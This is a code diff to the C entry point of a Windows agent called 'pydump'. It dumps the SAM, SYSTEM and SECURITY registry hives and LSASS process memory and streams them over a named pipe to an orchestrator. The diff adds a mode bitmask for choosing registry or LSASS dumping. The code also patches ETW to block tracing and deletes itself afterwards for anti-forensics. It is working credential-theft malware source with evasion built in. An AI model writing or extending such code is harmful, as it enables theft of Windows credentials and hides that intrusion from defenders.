@@ -1,16 +1,16 @@
 /**
  * pydump agent — entry point.
  *
- * Usage: agent.exe <LSASS_PID> <PIPE_NAME>
- *   PID > 0: extract registry hives + dump LSASS memory
- *   PID = 0: extract registry hives only
+ * Usage: agent.exe <MODE> <PID> <PIPE_NAME>
+ *   MODE: bitmask — 1=registry, 2=LSASS, 3=both
+ *   PID:  LSASS process ID (ignored if mode doesn't include LSASS)
  *
  * Protocol (on the named pipe):
  *   "PYD\x01"                          magic (4 bytes)
- *   <u32 size><data>                   SYSTEM hive
- *   <u32 size><data>                   SAM hive
- *   <u32 size><data>                   SECURITY hive
- *   <remaining bytes until close>      LSASS MDMP (if PID > 0)
+ *   <u32 size><data>                   SYSTEM hive  (0 if skipped)
+ *   <u32 size><data>                   SAM hive     (0 if skipped)
+ *   <u32 size><data>                   SECURITY hive(0 if skipped)
+ *   <remaining bytes until close>      LSASS MDMP   (if mode & 2)
  */
 
 #include <windows.h>
@@ -73,7 +73,7 @@ static void self_delete(void) {
 
 // Entry point — no CRT dependency for smaller binary
 void main_entry(void) {
-    // Parse command line: "agent.exe <PID> <PIPE_NAME>"
+    // Parse command line: "agent.exe <MODE> <PID> <PIPE_NAME>"
     wchar_t *cmdline = GetCommandLineW();
 
     // Skip executable name
@@ -87,6 +87,11 @@ void main_entry(void) {
     }
     while (*p == L' ') p++;
 
+    // Parse MODE (1=registry, 2=lsass, 3=both)
+    DWORD mode = wtoi(p);
+    while (*p && *p != L' ') p++;
+    while (*p == L' ') p++;
+
     // Parse PID
     DWORD pid = wtoi(p);
     while (*p && *p != L' ') p++;
@@ -94,12 +99,11 @@ void main_entry(void) {
 
     // Remaining is pipe name
     wchar_t *pipe_name = p;
-    // Trim trailing whitespace/newline
     wchar_t *end = pipe_name;
     while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
     *end = L'\0';
 
-    if (pipe_name[0] == L'\0') {
+    if (mode == 0 || pipe_name[0] == L'\0') {
         ExitProcess(1);
     }
 
@@ -108,37 +112,39 @@ void main_entry(void) {
         ExitProcess(2);
     }
 
-    // Step 2: Patch ETW to prevent tracing
+    // Step 2: Patch ETW
     patch_etw();
 
-    // Step 3: Load advapi32 for registry operations
-    if (!init_registry()) {
-        ExitProcess(2);
-    }
-
-    // Step 4: Create named pipe and wait for orchestrator
+    // Step 3: Create named pipe
     HANDLE pipe = open_named_pipe(pipe_name);
     if (!pipe) {
         ExitProcess(3);
     }
 
-    // Step 5: Write protocol header
+    // Step 4: Protocol header
     BYTE magic[4] = {'P', 'Y', 'D', 0x01};
     write_pipe(pipe, magic, 4);
 
-    // Step 6: Save and send registry hives (SYSTEM, SAM, SECURITY)
-    dump_registry_hives(pipe);
+    // Step 5: Registry hives (if mode & 1)
+    if (mode & 1) {
+        init_registry();
+        dump_registry_hives(pipe);
+    } else {
+        // Send 3 empty hive slots
+        DWORD zero = 0;
+        write_pipe(pipe, &zero, 4);
+        write_pipe(pipe, &zero, 4);
+        write_pipe(pipe, &zero, 4);
+    }
 
-    // Step 7: Dump LSASS if PID was provided
+    // Step 6: LSASS dump (if mode & 2)
     BOOL success = TRUE;
-    if (pid > 0) {
+    if ((mode & 2) && pid > 0) {
         success = dump_lsass(pid, pipe);
     }
 
-    // Step 8: Cleanup
+    // Step 7: Cleanup
     close_pipe(pipe);
-
-    // Step 9: Self-delete from disk (anti-forensics)
     self_delete();
 
     ExitProcess(success ? 0 : 4);
